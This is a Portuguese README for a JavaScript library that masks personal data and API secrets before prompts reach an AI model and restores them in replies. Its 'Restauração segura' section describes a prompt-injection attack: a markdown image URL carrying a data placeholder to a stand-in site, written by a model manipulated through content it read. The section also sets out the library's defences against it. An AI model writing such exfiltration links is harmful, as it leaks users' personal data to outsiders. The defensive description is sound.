# @guhttps/veu

**Véu para JavaScript e TypeScript.** Esconde dados pessoais e segredos (nomes, e-mails, telefones de qualquer país, CPF, CNPJ, cartões, chaves de API, senhas) antes de o texto chegar a um modelo de IA, e devolve os dados reais na resposta.

```
Você escreve:   "Cliente Maria Souza, CPF 529.982.247-25, chave sk-proj-..."
A IA recebe:    "Cliente [PESSOA_1], CPF [CPF_1], chave [CHAVE_API_1]"
A IA responde:  "Olá [PESSOA_1], ..."
Você recebe:    "Olá Maria Souza, ..."
```

- **Sem dependências e sem servidor:** roda no Node, no Deno, no Bun, no navegador e em edge functions.
- **Mesma detecção da versão em Python:** um teste de conformidade com 235 casos garante resultados idênticos.
- **Funciona com o que você já usa:** SDKs da OpenAI e da Anthropic, AI SDK da Vercel e qualquer código que aceite um `fetch`.

```bash
npm install @guhttps/veu
```

## Uso básico

```ts
import { Veu } from "@guhttps/veu";

const veu = new Veu();
const resultado = veu.anonymize("Cliente Maria Souza, CPF 529.982.247-25");
resultado.text;                                   // "Cliente [PESSOA_1], CPF [CPF_1]"
resultado.restore("Olá [PESSOA_1]!");              // "Olá Maria Souza!"
veu.analyze("chave sk-proj-...");                 // [{ label: "CHAVE_API", start, end, score, text }]
```

Numa conversa com várias mensagens, use uma sessão: o mesmo CPF vira o mesmo marcador em todas elas.

```ts
const sessao = veu.session();
const mensagens = sessao.anonymizeData([{ role: "user", content: "Meu CPF é 529.982.247-25" }]);
const resposta = sessao.restore(textoDaIA);
for await (const pedaco of sessao.restoreStream(streamDeTexto)) process.stdout.write(pedaco);
```

## SDK da OpenAI, da Anthropic e outros (sem proxy)

```ts
import OpenAI from "openai";
import Anthropic from "@anthropic-ai/sdk";
import { createFetch } from "@guhttps/veu/fetch";

const openai = new OpenAI({ fetch: createFetch() });
const anthropic = new Anthropic({ fetch: createFetch() });
```

O `createFetch` entende Chat Completions, Responses, Embeddings, Anthropic Messages, Gemini e a API nativa do Ollama, inclusive em streaming. Requisições que não são de IA passam sem mudança.

Opções:

- `session`: compartilha o cofre entre chamadas.
- `block: ["CHAVE_PRIVADA"]`: recusa a requisição em vez de esconder o dado.
- `onMask: ({ counts }) => ...`: avisa quantos dados foram escondidos (só contagens, nunca os valores).
- `veu: new Veu({...})`: usa uma configuração própria.

## AI SDK da Vercel

```ts
import { generateText, wrapLanguageModel } from "ai";
import { openai } from "@ai-sdk/openai";
import { veuMiddleware } from "@guhttps/veu/ai-sdk";

const model = wrapLanguageModel({ model: openai("gpt-5-mini"), middleware: veuMiddleware() });
const { text } = await generateText({ model, prompt: "Resuma o caso da cliente Maria Souza, CPF 529.982.247-25" });
```

Protege textos, argumentos de ferramentas e resultados de ferramentas, em `generateText` e `streamText`. Para o AI SDK 6, use `veuMiddleware({ version: "v3" })`; para o 5, `version: "v2"`.

## No navegador

```html
<script src="https://cdn.jsdelivr.net/npm/@guhttps/veu@0.6.0/dist/veu.global.js"></script>
<script>
  const resultado = new veu.Veu().anonymize(document.querySelector("textarea").value);
</script>
```

## Configuração

```ts
new Veu({
  threshold: 0.6,                         // exige valores válidos (dígitos verificadores)
  labels: ["CPF", "CNPJ", "CHAVE_API"],   // só estes tipos
  allowlist: ["contato@minhaempresa.com.br"],
  allowPatterns: ["@minhaempresa\\.com\\.br$"],
  detectors: ["padroes", "segredos"],     // sem nomes e endereços
  operator: "mascara",                    // token (padrão), mascara, remover ou hash
  operators: { CARTAO_CREDITO: "remover" },
  customPatterns: [{ entidade: "MATRICULA", padrao: "MAT-\\d{6}" }],
  restore: { linkHosts: ["intranet.minhaempresa.com.br"] }, // veja "Restauração segura"
});
```

## Restauração segura

A IA pode ser induzida, por uma página ou um e-mail que ela leu, a escrever `![x](https://site/?d=[CPF_1])`. Se o marcador virasse o CPF real ali, o navegador o enviaria ao site. Por isso, por padrão:

- os dados reais **não voltam dentro de links, imagens, URLs e atributos HTML**, nem em streaming;
- chaves de API, tokens e senhas **não voltam nos argumentos de ferramentas**;
- marcadores que já chegam no texto (`[CPF_1]` escrito por outra pessoa) são desarmados para `[CPF#1]`.

```ts
new Veu({ restore: {
  links: false,               // true: restaura também dentro de links
  linkHosts: ["empresa.com"], // links destes domínios recebem os dados reais
  tools: true,                // false: não restaura nenhum argumento de ferramenta
  secretsInTools: false,      // true: restaura chaves e senhas nos argumentos
} });
```

O operador `sintetico` (outro CPF válido no lugar do original) ainda só existe na versão em Python.

## O que é detectado

- **Documentos:** CPF, CNPJ (inclusive o alfanumérico de 2026), RG, CNH, título de eleitor, PIS, CNS e passaporte.
- **Contatos:** nomes, telefones (brasileiros e internacionais), e-mails e endereços.
- **Dados financeiros e outros:** CEP, placa, RENAVAM, cartões, contas, IBAN, chave Pix, IP, data de nascimento e processo judicial.
- **Segredos:**
  - chaves de API da OpenAI, Anthropic, AWS, Google, GitHub, Stripe, Mercado Pago, Asaas, Notion e mais 20 serviços;
  - JWT e tokens Bearer;
  - senhas;
  - chaves privadas;
  - URLs de conexão com senha.

Nenhuma detecção automática é perfeita: o Véu reduz muito o risco, mas não o elimina. Veja o [benchmark](https://github.com/guhttps/veu#benchmark).

Licença MIT. Repositório: https://github.com/guhttps/veu
